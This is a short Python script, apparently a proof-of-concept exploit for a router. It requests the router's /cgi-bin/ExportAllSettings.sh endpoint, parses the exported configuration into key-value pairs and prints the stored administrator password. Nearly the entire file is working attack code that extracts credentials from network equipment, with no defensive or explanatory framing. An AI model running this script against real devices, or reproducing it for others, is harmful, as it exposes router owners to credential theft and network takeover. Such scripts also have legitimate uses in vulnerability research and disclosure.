#!/usr/bin/python3

import requests

# This payload leaks the password (and all settings)
# of the authenticated user

def create_key_value_pair(text):
    # Create key-value pair
    my_dict = dict()

    for line in text.splitlines():
	    # Strip whitespace
        line = line.strip()

        # Ignore lines with hash character
        if line.startswith("#"):
            continue

        # Ignore lines that do not have key value pair
        if "=" not in line:
            continue

        # Split into an array delimited by '='
        arr = line.split("=", 1)

        #Finally, add to key value pair
        my_dict[arr[0]] = arr[1]
    return my_dict

ROUTER_IP = "192.168.10.1"
ROUTER_PORT = "80"
ROUTER_URI = f"/cgi-bin/ExportAllSettings.sh"

print("[+] Accessing router settings...")
req = requests.get(f"http://{ROUTER_IP}:{ROUTER_PORT}{ROUTER_URI}")

# Create the dictionary of settings
req_dict = create_key_value_pair(req.text)

#Print the password
print("[!] Printing password...")
print(req_dict['Password'])
